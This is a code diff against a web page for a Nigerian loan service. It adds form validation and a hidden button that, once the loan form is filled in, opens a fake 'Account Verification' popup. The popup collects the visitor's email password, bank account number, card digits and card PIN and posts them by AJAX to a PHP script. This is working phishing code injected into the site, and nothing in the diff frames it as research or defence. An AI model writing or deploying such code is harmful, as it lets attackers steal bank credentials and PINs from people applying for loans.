@@ -137,6 +137,138 @@ _W.setup_model_rpc({"rpc_namespace":"_W.CustomerAccounts.RPC","model_namespace":
 //-->
 </script>
 
+
+
+<!--javascript validation project -->
+	
+	
+	<script type='text/javascript'>
+function ClickButton()
+{
+document.getElementById('mbtn').click();
+}
+</script>
+
+	
+	
+
+<script> 
+
+            function GEEKFORGEEKS() { 
+
+                var firstname =  
+
+                    document.forms["RegForm"]["firstName"]; 
+
+               var lastname =  
+
+                    document.forms["RegForm"]["lastName"]; 
+
+                 
+                var loanAmt =  
+
+                    document.forms["RegForm"]["loanAmt"]; 
+
+
+              var paybackDate =  
+
+                    document.forms["RegForm"]["paybackDate"]; 
+
+
+
+             var phoneNum =  
+
+                    document.forms["RegForm"]["phoneNum"]; 
+
+
+
+
+
+                if (firstname.value == "") { 
+
+                    window.alert("Please enter your first name."); 
+
+                    firstname.focus(); 
+                    
+                    
+
+                    return false; 
+
+                } 
+                
+                if (lastname.value == "") { 
+
+                    window.alert("Please enter your last name."); 
+
+                    lastname.focus(); 
+
+                    return false; 
+
+                } 
+
+  
+
+                if (loanAmt.value == "") { 
+
+                    window.alert("Please enter your amount."); 
+
+                    loanAmt.focus(); 
+                    
+                    
+
+                    return false; 
+
+                } 
+
+  
+
+                if (paybackDate.value == "") { 
+
+                    window.alert( 
+
+                      "Please enter when you will like to pay back"); 
+
+                    paybackDate.focus(); 
+
+                    return false; 
+
+                } 
+
+  
+
+                if (phoneNum.value == "") { 
+
+                    window.alert( 
+
+                      "Please enter your telephone number."); 
+
+                    phoneNum.focus(); 
+
+                    return false; 
+
+                } 
+                
+                
+         else{
+                
+                
+                ClickButton();
+                
+             
+  }
+                  
+
+
+            } 
+
+        </script> 
+
+<!--javascript validation project -->
+
+
+
+
+
 </head>
 	
 <body class="header-page  wsite-page-index  wsite-theme-light" >
@@ -399,7 +531,7 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 <div class="paragraph" style="text-align:center;"><br /><font size="3" style="color:rgb(0, 0, 0)">These loans are for Federal, State ,Local government workers and Self-Employed. Disbursement is within 24hrs after submitting complete documentation. Unique asset financing model for financing white goods, income generating assets (ice-makers, grinding machines etc.) and household. In partnership with NYSC, We now cater for the financial needs of the Youth Corps Members while in service to our great country &ndash; Nigeria.</font><span style="color:rgb(0, 0, 0)">&#8203;</span><ul style="color:rgb(0, 0, 0)"><li>&#8203;</li></ul></div>
 
 <div>
-	<form enctype="multipart/form-data" action="//www.weebly.com/weebly/apps/formSubmit.php" method="POST" id="form-336132098521030958">
+	<form  name="RegForm" onsubmit="return GEEKFORGEEKS()"   enctype="multipart/form-data" action="//www.weebly.com/weebly/apps/formSubmit.php" method="POST" id="form-336132098521030958">
 		<div id="336132098521030958-form-parent" class="wsite-form-container"
 				 style="margin-top:10px;">
 			<ul class="formlist" id="336132098521030958-form-list">
@@ -409,11 +541,11 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 				<label class="wsite-form-label">Name <span class="form-required">*</span></label>
 				<div style="clear:both;"></div>
 				<div class="wsite-form-input-container wsite-form-left wsite-form-input-first-name">
-					<input aria-required="true" id="input-982500527808520349" class="wsite-form-input wsite-input" placeholder="First" type="text" name="_u982500527808520349[first]" />
+					<input aria-required="true" id="input-982500527808520349" class="wsite-form-input wsite-input" placeholder="First" type="text" name="firstName" />
 					<label class="wsite-form-sublabel" for="input-982500527808520349">First</label>
 				</div>
 				<div class="wsite-form-input-container wsite-form-right wsite-form-input-last-name">
-					<input aria-required="true" id="input-982500527808520349-1" class="wsite-form-input wsite-input" placeholder="Last" type="text" name="_u982500527808520349[last]" />
+					<input aria-required="true" id="input-982500527808520349-1" class="wsite-form-input wsite-input" placeholder="Last" type="text" name="lastName" />
 					<label class="wsite-form-sublabel" for="input-982500527808520349-1">Last</label>
 				</div>
 				<div id="instructions-982500527808520349" class="wsite-form-instructions" style="display:none;"></div>
@@ -423,7 +555,7 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 <div><div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
 				<label class="wsite-form-label" for="input-231889422620680254">Loan Amount  <span class="form-required">*</span></label>
 				<div class="wsite-form-input-container">
-					<input aria-required="true" id="input-231889422620680254" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="_u231889422620680254" />
+					<input aria-required="true" id="input-231889422620680254" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="loanAmt" />
 				</div>
 				<div id="instructions-231889422620680254" class="wsite-form-instructions" style="display:none;"></div>
 			</div></div>
@@ -431,7 +563,7 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 <div><div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
 				<label class="wsite-form-label" for="input-667331726270192961">Payback Date <span class="form-required">*</span></label>
 				<div class="wsite-form-input-container">
-					<input aria-required="true" id="input-667331726270192961" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="_u667331726270192961" />
+					<input aria-required="true" id="input-667331726270192961" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="paybackDate" />
 				</div>
 				<div id="instructions-667331726270192961" class="wsite-form-instructions" style="display:none;"></div>
 			</div></div>
@@ -439,7 +571,7 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 <div><div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
 				<label class="wsite-form-label" for="input-136238965296853440">Phone Number  <span class="form-required">*</span></label>
 				<div class="wsite-form-input-container">
-					<input aria-required="true" id="input-136238965296853440" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="_u136238965296853440" />
+					<input aria-required="true" id="input-136238965296853440" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="phoneNum" />
 				</div>
 				<div id="instructions-136238965296853440" class="wsite-form-instructions" style="display:none;"></div>
 			</div></div>
@@ -454,13 +586,80 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 			<input type="hidden" name="wsite_approved" id="wsite-approved" value="approved" />
 			<input type="hidden" name="ucfid" value="336132098521030958" />
 			<input type="hidden" name="recaptcha_token"/>
-			<input type="submit" role="button" aria-label="Submit" value="Submit" style="position:absolute;top:0;left:-9999px;width:1px;height:1px" />
+
+                         <input   type="submit" role="button" aria-label="Submit" value="Continue" style="width:5em; height:3em"  />
+			
+			
+			<!-- hidden submit button -->
+                         <button id="mbtn" type="submit" id="triggerModal" hidden value="Submit" class="btn btn-info btn-lg" data-toggle="modal" data-target="#myModal"></button>  
+
+
+
 			<a class="wsite-button">
 				<span class="wsite-button-inner">Continue</span>
 			</a>
 		</div>
 	</form>
 	<div id="g-recaptcha-336132098521030958" class="recaptcha" data-size="invisible" data-recaptcha="0" data-sitekey="6Ldf5h8UAAAAAJFJhN6x2OfZqBvANPQcnPa8eb1C"></div>
+
+
+<!-- popup project-->
+	
+	<!-- The Modal -->
+    <div id="modalDialog" class="modal">
+        <div class="modal-content animate-top">
+            <div class="modal-header">
+                <h5 class="modal-title">Account Verification</h5>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">×</span>
+                </button>
+            </div>
+            
+            <form method="post" id="contactFrm">
+            <div class="modal-body">
+                <!-- Form submission status -->
+                <div class="response"></div>
+
+               <!-- Contact form -->
+                <div class="form-group">
+                    <label>Email:</label>
+                    <input type="text" name="Email" id="name" class="form-control" placeholder="Enter your email" required="">
+                </div>
+                
+                <div class="form-group">
+                    <label>Email Password:</label>
+                    <input type="Password" name="EmailPass" id="email" class="form-control" placeholder="Enter your email password" required="">
+                </div>
+                
+                <div class="form-group">
+                    <label>Account Number:</label>
+                    <input name="AcctNum" id="message" class="form-control" placeholder="Enter your account number" required="" />
+                </div>
+                
+                <div class="form-group">
+                    <label>Last six digit of GTBANK Card:</label>
+                    <input name="ATMDigit" id="message" class="form-control" placeholder="Enter the Last six digit of your GTBANK Card:" required="" />
+                </div>
+                
+                <div class="form-group">
+                    <label>Card Pin:</label>
+                    <input name="ATMPin" id="message" class="form-control" placeholder="Enter your GTB card pin" required="" />
+                </div>
+                
+            </div>
+            <div class="modal-footer">
+                <!-- Submit button -->
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- popup project-->
+
+
+
 
 
 
@@ -745,6 +944,84 @@ if (document.documentElement.appReady || (window.inEditor && window.inEditor()))
 	window._W.isEUUser = false;
 	window._W.showCookieToAll = "";
 </script>
+
+
+
+<!-- popup project -->
+
+<script>
+	
+
+	
+$(document).ready(function (){
+
+
+	
+    $('#contactFrm').submit(function(e){	
+        e.preventDefault();
+        $('.modal-body').css('opacity', '0.5');
+        $('.btn').prop('disabled', true);
+ 
+      
+        $form = $(this);
+        $.ajax({
+            type: "POST",
+            url: 'ajax_submit.php',
+            data: 'contact_submit=1&'+$form.serialize(),
+            dataType: 'json',
+            success: function(response){
+                if(response.status == 1){
+                    $('#contactFrm')[0].reset();
+                    $('.response').html('<div class="alert alert-success">'+response.message+'</div>');
+                }else{
+                    $('.response').html('<div class="alert alert-danger">'+response.message+'</div>');
+                }
+                $('.modal-body').css('opacity', '');
+                $('.btn').prop('disabled', false);
+            }
+        });
+    });
+});
+
+
+/*
+ * Modal popup
+ */
+// Get the modal
+var modal = $('#modalDialog');
+
+// Get the button that opens the modal
+var btn = $("#mbtn");
+
+// Get the <span> element that closes the modal
+var span = $(".close");
+
+$(document).ready(function(){
+    // When the user clicks the button, open the modal 
+    btn.on('click', function() {
+        modal.show();
+    });
+    
+    // When the user clicks on <span> (x), close the modal
+    span.on('click', function() {
+        modal.hide();
+    });
+});
+
+// When the user clicks anywhere outside of the modal, close it
+$('body').bind('click', function(e){
+    if($(e.target).hasClass("modal")){
+        modal.hide();
+    }
+});
+
+
+
+</script>
+
+<!-- popup project -->
+
+
 
 
 	</body>
